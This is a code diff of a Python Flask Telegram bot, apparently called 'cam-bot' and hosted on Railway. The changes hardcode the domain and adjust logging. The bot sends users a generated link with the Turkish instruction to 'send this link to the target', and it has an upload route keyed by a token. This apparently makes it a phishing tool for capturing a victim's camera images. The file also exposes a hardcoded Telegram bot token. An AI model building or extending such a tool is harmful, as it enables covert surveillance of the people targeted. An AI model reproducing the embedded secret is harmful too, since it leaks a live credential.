@@ -8,12 +8,7 @@ import requests
 TOKEN = "8890650354:AAHG_DYLxeIsZMdTxZneIK7ZzbaOJlGsvyA"
 API_URL = "https://api.telegram.org/bot" + TOKEN
 
-# Railway domain - sadece environment variable'dan al
-RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
-if not RAILWAY_DOMAIN:
-    RAILWAY_DOMAIN = os.environ.get("RAILWAY_STATIC_URL", "cam-bot.up.railway.app")
-
-RAILWAY_DOMAIN = RAILWAY_DOMAIN.lower()
+RAILWAY_DOMAIN = "web-production-2428c.up.railway.app"
 WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
 PORT = int(os.environ.get("PORT", 5000))
 
@@ -25,10 +20,7 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__, static_folder="static")
 
 logger.info("=== BOT STARTED ===")
-logger.info("TOKEN: " + TOKEN[:15] + "...")
 logger.info("DOMAIN: " + RAILWAY_DOMAIN)
-logger.info("WEBHOOK: " + WEBHOOK_URL)
-logger.info("PORT: " + str(PORT))
 
 @app.route("/" + TOKEN, methods=["POST"])
 def webhook():
@@ -51,9 +43,10 @@ def webhook():
             msg = "Merhaba @" + username + "!\n\nLink: " + link + "\n\nBu linki hedefe gonder."
 
             url = API_URL + "/sendMessage"
-            payload = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}
+            payload = {"chat_id": chat_id, "text": msg}
             r = requests.post(url, json=payload, timeout=10)
             logger.info("SEND STATUS: " + str(r.status_code))
+            logger.info("RESPONSE: " + str(r.text))
 
     return "OK", 200
 
@@ -90,7 +83,7 @@ def upload(token):
 
 @app.route("/")
 def home():
-    return "OK - Domain: " + RAILWAY_DOMAIN
+    return "OK - " + RAILWAY_DOMAIN
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=PORT)
